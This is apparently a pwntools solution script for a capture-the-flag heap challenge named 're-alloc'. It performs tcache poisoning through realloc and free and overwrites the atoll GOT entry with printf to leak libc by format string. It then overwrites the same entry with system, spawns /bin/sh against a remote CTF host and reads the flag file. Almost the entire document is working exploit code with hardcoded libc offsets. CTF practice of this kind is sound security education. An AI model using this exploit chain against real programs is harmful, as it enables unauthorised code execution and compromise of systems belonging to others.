from pwn import *
import time
import sys


def alloc(ind, size, data):
    proc.sendlineafter(b': ', b'1')
    proc.sendlineafter(b':', f'{ind}'.encode())
    proc.sendlineafter(b':', f'{size}'.encode())
    proc.sendafter(b':', data)

def realloc(ind, size, data):
    proc.sendlineafter(b': ', b'2')
    proc.sendlineafter(b':', f'{ind}'.encode())
    proc.sendlineafter(b':', f'{size}'.encode())
    proc.sendafter(b':', data)

def realloc_free(ind):
    proc.sendlineafter(b': ', b'2')
    proc.sendlineafter(b':', f'{ind}'.encode())
    proc.sendlineafter(b':', b'0')

def free(ind):
    proc.sendlineafter(b': ', b'3')
    proc.sendlineafter(b':', f'{ind}'.encode())

def exit():
    proc.sendlineafter(b': ', b'4')

def printf(buf):
    proc.sendlineafter(b': ', b'3')
    proc.sendafter(b':', buf)


def overlap(size):
    for i in range(7):
        alloc(0, 0x18, b'A')
        realloc(0, size, b'A')
        free(0)
    alloc(0, 0x18, b'A')
    realloc(0, size, b'A')
    alloc(1, 0x18, b'A')
    realloc(1, size, b'A')
    realloc_free(0)
    free(1)
    free(0)
    for i in range(7):
        alloc(0, size, b'A')
        realloc(0, 0x18, b'A')
        free(0)

def set_target(size, target):
    alloc(0, size, p64(target))
    for i in range(size - 0x20, 0, -0x20):
        realloc(0, i, p64(target))
    for i in range(2):
        alloc(1, size, b'A')
        for j in range(size - 0x20, 0, -0x20):
            realloc(1, j, b'A')
        free(1)
    free(0)


def exploit():
    if len(sys.argv) <= 1:
        input('attach to pid: {}'.format(proc.proc.pid))
    atoll_got = 0x404048
    printf_plt = 0x401076

    overlap(0x58)
    overlap(0x78)
    for i in range(7):
        alloc(0, 0x58, b'A')
        realloc(0, 0x18, b'A')
        free(0)
    set_target(0x58, atoll_got)
    set_target(0x78, atoll_got)

    alloc(0, 0x58, flat(printf_plt))
    printf("%p|%p|%p>>>")
    libc = proc.recvuntil(b'>>>').split(b'|')[2]
    libc = int(libc[:-3], 16)
    if len(sys.argv) <= 1:
        # local
        libc -= 0x101ac9
        system = libc + 0x41c50
    else:
        # remote
        libc -= 0x12e009
        system = libc + 0x52fd0
    log.info('libc: ' + hex(libc))

    # alloc(1, 0x78, p64(system))
    proc.sendlineafter(b': ', b'1')
    proc.sendafter(b':', b'A' * 1)
    proc.sendafter(b':', b'%120p')
    proc.sendafter(b':', p64(system))
    proc.sendlineafter(b': ', b'1')
    proc.sendlineafter(b':', b'/bin/sh')
    proc.sendline(b'cat /home/re-alloc/flag')
    # FLAG{Heeeeeeeeeeeeeeeeeeeeeee4p}


if __name__ == '__main__':
    context.arch = 'amd64'
    connect = 'nc eductf.zoolab.org 10106'
    connect = connect.split(' ')
    if len(sys.argv) > 1:
        proc = remote(connect[1], int(connect[2]))
    else:
        proc = process(['./re-alloc'])
    exploit()
    proc.interactive()
